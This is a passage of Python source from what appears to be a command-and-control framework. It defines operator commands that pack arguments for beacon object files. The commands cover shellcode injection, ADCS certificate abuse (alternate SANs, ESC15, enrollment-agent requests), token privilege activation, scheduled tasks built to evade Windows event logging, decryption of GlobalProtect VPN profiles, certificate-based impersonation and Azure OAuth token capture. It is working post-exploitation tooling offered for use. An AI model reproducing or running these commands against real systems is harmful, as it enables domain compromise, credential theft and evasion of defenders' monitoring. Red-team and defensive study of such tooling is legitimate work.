            description = f"spawning as user '{args.USERNAME}' and injecting shellcode"
        )


##
## ADCS commands
##

@KnRegisterCommand( command     = 'adcs_request',
                    description = 'request an enrollment certificate',
                    group       = 'Remote Operations Commands' )
class ObjectAdcsRequestTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   CA         - Certificate authority (required)\n"
            "   --template - Certificate type (default: User/Machine)\n"
            "   --subject  - Subject's distinguished name\n"
            "   --altname  - Alternate subject's distinguished name\n"
            "   --alturl   - SAN URL entry (can specify alternate subject's SID)\n"
            "   --install  - Install cert in current context\n"
            "   --machine  - Request for machine instead of user\n"
            "   --app-policy - Add App policy for ESC15\n"
            "   --dns      - Subject alt name as DNS instead of UPN\n"
        )

        parser.add_argument( 'CA', type=str, help='certificate authority to use' )
        parser.add_argument( '--template', dest='TEMPLATE', default='', type=str, help='certificate type' )
        parser.add_argument( '--subject', dest='SUBJECT', default='', type=str, help='subject distinguished name' )
        parser.add_argument( '--altname', dest='ALTNAME', default='', type=str, help='alternate subject distinguished name' )
        parser.add_argument( '--alturl', dest='ALTURL', default='', type=str, help='SAN URL entry' )
        parser.add_argument( '--install', dest='INSTALL', action='store_true', help='install cert in current context' )
        parser.add_argument( '--machine', dest='MACHINE', action='store_true', help='request for machine instead of user' )
        parser.add_argument( '--app-policy', dest='APP_POLICY', action='store_true', help='add app policy for ESC15' )
        parser.add_argument( '--dns', dest='DNS', action='store_true', help='SAN as DNS instead of UPN' )

    async def execute( self, args ):
        return await self.execute_object(
            argv        = bof_pack( 'ZZZZZssss', args.CA, args.TEMPLATE, args.SUBJECT, args.ALTNAME,
                                    args.ALTURL, 1 if args.INSTALL else 0, 1 if args.MACHINE else 0,
                                    1 if args.APP_POLICY else 0, 1 if args.DNS else 0 ),
            description = f"requesting certificate from CA '{args.CA}'"
        )


@KnRegisterCommand( command     = 'adcs_request_on_behalf',
                    description = 'request certificate on behalf of another user',
                    group       = 'Remote Operations Commands' )
class ObjectAdcsRequestOnBehalfTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Uses an enrollment agent certificate to request a certificate on behalf\n"
            "   of another user in the domain.\n"
        )

        parser.add_argument( 'TEMPLATE', type=str, help='template to request on behalf of target' )
        parser.add_argument( 'REQUESTER', type=str, help='domain\\username to request on behalf of' )
        parser.add_argument( 'ENROLLMENT_AGENT_PFX', type=str, help='local path to enrollment agent .pfx' )
        parser.add_argument( 'DOWNLOAD_NAME', type=str, help='name for the downloaded file' )

    async def execute( self, args ):
        if not exists( args.ENROLLMENT_AGENT_PFX ):
            self.log_error( f"PFX file not found: {args.ENROLLMENT_AGENT_PFX}" )
            return

        pfx_data = file_read( args.ENROLLMENT_AGENT_PFX )

        return await self.execute_object(
            argv        = bof_pack( 'ZZzb', args.TEMPLATE, args.REQUESTER, args.DOWNLOAD_NAME, pfx_data ),
            description = f"requesting certificate on behalf of '{args.REQUESTER}'"
        )


##
## privilege commands
##

@KnRegisterCommand( command     = 'get_priv',
                    description = 'activate a token privilege',
                    group       = 'Remote Operations Commands' )
class ObjectGetPrivTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Common privileges:\n"
            "     SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege,\n"
            "     SeTakeOwnershipPrivilege, SeImpersonatePrivilege\n\n"
            "   See: https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants\n"
        )

        parser.add_argument( 'PRIVILEGE', type=str, help='privilege name to activate' )

    async def execute( self, args ):
        return await self.execute_object(
            argv        = bof_pack( 'z', args.PRIVILEGE ),
            description = f"activating privilege '{args.PRIVILEGE}'"
        )


##
## ghost task command
##

@KnRegisterCommand( command     = 'ghost_task',
                    description = 'create/modify scheduled task without triggering events 4698/106',
                    group       = 'Remote Operations Commands' )
class ObjectGhostTaskTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   SCHEDULETYPE: second, daily, weekly, logon\n"
            "   TIME: For second=frequency in seconds, for daily/weekly=HH:MM\n"
            "   DAY: For weekly only (e.g., monday,thursday)\n\n"
            "   Note: Requires NT AUTHORITY/SYSTEM privileges.\n"
            "         System reboot or service restart required to load the task.\n"
        )

        parser.add_argument( 'HOSTNAME', type=str, help='target hostname or localhost' )
        parser.add_argument( 'OPERATION', type=str, choices=['add', 'delete'], help='operation to perform' )
        parser.add_argument( 'TASKNAME', type=str, help='name of the scheduled task' )
        parser.add_argument( 'PROGRAM', nargs='?', default='', type=str, help='program to execute (for add)' )
        parser.add_argument( 'ARGUMENT', nargs='?', default='', type=str, help='arguments for the program (for add)' )
        parser.add_argument( 'USERNAME', nargs='?', default='', type=str, help='user account for the task (for add)' )
        parser.add_argument( 'SCHEDULETYPE', nargs='?', default='', type=str, help='trigger type: second, daily, weekly, logon (for add)' )
        parser.add_argument( 'TIME', nargs='?', default='', type=str, help='time or frequency (for add)' )
        parser.add_argument( 'DAY', nargs='?', default='', type=str, help='days for weekly trigger (for add)' )

    async def execute( self, args ):
        hostname = args.HOSTNAME.lower()
        operation = args.OPERATION.lower()

        if operation == 'add':
            if not args.PROGRAM or not args.USERNAME or not args.SCHEDULETYPE:
                self.log_error( 'missing required arguments for add operation: PROGRAM, USERNAME, SCHEDULETYPE' )
                return

            taskname = args.TASKNAME.lower()
            program = args.PROGRAM.lower()
            argument = args.ARGUMENT.lower()
            username = args.USERNAME.lower()
            scheduletype = args.SCHEDULETYPE.lower()

            if scheduletype == 'weekly':
                if not args.TIME or not args.DAY:
                    self.log_error( 'weekly schedule requires TIME and DAY' )
                    return
                argcount = 10
                argv = bof_pack( 'izzzzzzzzz', argcount, hostname, operation, taskname, program,
                                argument, username, scheduletype, args.TIME.lower(), args.DAY.lower() )
            elif scheduletype in ['second', 'daily']:
                if not args.TIME:
                    self.log_error( f'{scheduletype} schedule requires TIME' )
                    return
                argcount = 9
                argv = bof_pack( 'izzzzzzzz', argcount, hostname, operation, taskname, program,
                                argument, username, scheduletype, args.TIME.lower() )
            elif scheduletype == 'logon':
                argcount = 8
                argv = bof_pack( 'izzzzzzz', argcount, hostname, operation, taskname, program,
                                argument, username, scheduletype )
            else:
                self.log_error( f'unknown schedule type: {scheduletype}' )
                return

            description = f"creating ghost task '{taskname}' on '{hostname}'"

        elif operation == 'delete':
            taskname = args.TASKNAME.lower()
            argcount = 4
            argv = bof_pack( 'izzz', argcount, hostname, operation, taskname )
            description = f"deleting ghost task '{taskname}' on '{hostname}'"

        return await self.execute_object(
            argv        = argv,
            description = description
        )


##
## system commands
##

@KnRegisterCommand( command     = 'shutdown',
                    description = 'shutdown or reboot a local or remote system',
                    group       = 'Remote Operations Commands' )
class ObjectShutdownTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   TIME      - Seconds before shutdown (0=immediate, non-zero prompts user)\n"
            "   CLOSEAPPS - 0=allow save, 1=force close\n"
            "   REBOOT    - 0=shutdown, 1=reboot\n"
        )

        parser.add_argument( 'TIME', type=int, help='seconds before shutdown' )
        parser.add_argument( 'CLOSEAPPS', type=int, choices=[0, 1], help='close apps (0=save, 1=force)' )
        parser.add_argument( 'REBOOT', type=int, choices=[0, 1], help='action (0=shutdown, 1=reboot)' )
        parser.add_argument( '--hostname', dest='HOSTNAME', default='', type=str, help='target host (default: localhost)' )
        parser.add_argument( '--message', dest='MESSAGE', default='', type=str, help='message before shutdown' )

    async def execute( self, args ):
        action = 'rebooting' if args.REBOOT else 'shutting down'
        target = args.HOSTNAME if args.HOSTNAME else 'localhost'

        return await self.execute_object(
            argv        = bof_pack( 'zziss', args.HOSTNAME, args.MESSAGE, args.TIME, args.CLOSEAPPS, args.REBOOT ),
            description = f"{action} '{target}' in {args.TIME} seconds"
        )


@KnRegisterCommand( command     = 'global_unprotect',
                    description = 'find, decrypt, download Global Protect VPN profiles and HIP settings',
                    group       = 'Remote Operations Commands' )
class ObjectGlobalUnprotectTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Attempts to find, decrypt, and download Global Protect VPN profiles\n"
            "   and HIP settings.\n"
        )


##
## certificate/token commands
##

@KnRegisterCommand( command     = 'make_token_cert',
                    description = 'apply impersonation token from .pfx Alt Name',
                    group       = 'Remote Operations Commands' )
class ObjectMakeTokenCertTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   Reads a .pfx file, imports it to the certificate store, creates an\n"
            "   impersonation token based on the Alt Name, then deletes it from the store.\n"
        )

        parser.add_argument( 'PFX_PATH', type=str, help='path to .pfx file' )
        parser.add_argument( 'PASSWORD', nargs='?', default='', type=str, help='password to decrypt .pfx (default: none)' )

    async def execute( self, args ):
        if not exists( args.PFX_PATH ):
            self.log_error( f"PFX file not found: {args.PFX_PATH}" )
            return

        cert_data = file_read( args.PFX_PATH )

        return await self.execute_object(
            argv        = bof_pack( 'bZ', cert_data, args.PASSWORD ),
            description = f"creating impersonation token from certificate '{args.PFX_PATH}'"
        )


@KnRegisterCommand( command     = 'get_azure_token',
                    description = 'perform OAuth code grant against Azure',
                    group       = 'Remote Operations Commands' )
class ObjectGetAzureTokenTask( RemoteOpsTaskBase ):

    @staticmethod
    def arguments( parser ):
        parser.epilog = (
            "   BROWSER values:\n"
            "     0 - Edge\n"
            "     1 - Chrome\n"
            "     2 - Default browser\n"
            "     3 - Other (requires --browser-path)\n\n"
            "   Example:\n"
            "     get_azure_token 1950a258-227b-4e31-a9cf-717495945fc2 \\\n"
            "       \"74658136-14ec-4630-ad9b-26e160ff0fc6/user_impersonation offline_access openid profile\" \\\n"
            "       2 --hint \"user@domain.com\"\n"
        )

        parser.add_argument( 'CLIENT_ID', type=str, help='client ID (must have consent in tenant)' )
        parser.add_argument( 'SCOPE', type=str, help='scope (must match client_id expectations)' )
        parser.add_argument( 'BROWSER', type=int, choices=[0, 1, 2, 3], help='browser type' )
        parser.add_argument( '--hint', dest='HINT', default='', type=str, help='email hint for authentication' )
        parser.add_argument( '--browser-path', dest='BROWSER_PATH', default='', type=str, help='browser executable path (for browser type 3)' )

    async def execute( self, args ):
        return await self.execute_object(
            argv        = bof_pack( 'zzizz', args.CLIENT_ID, args.SCOPE, args.BROWSER, args.HINT, args.BROWSER_PATH ),
            description = f"performing Azure OAuth with client_id '{args.CLIENT_ID}'"
        )
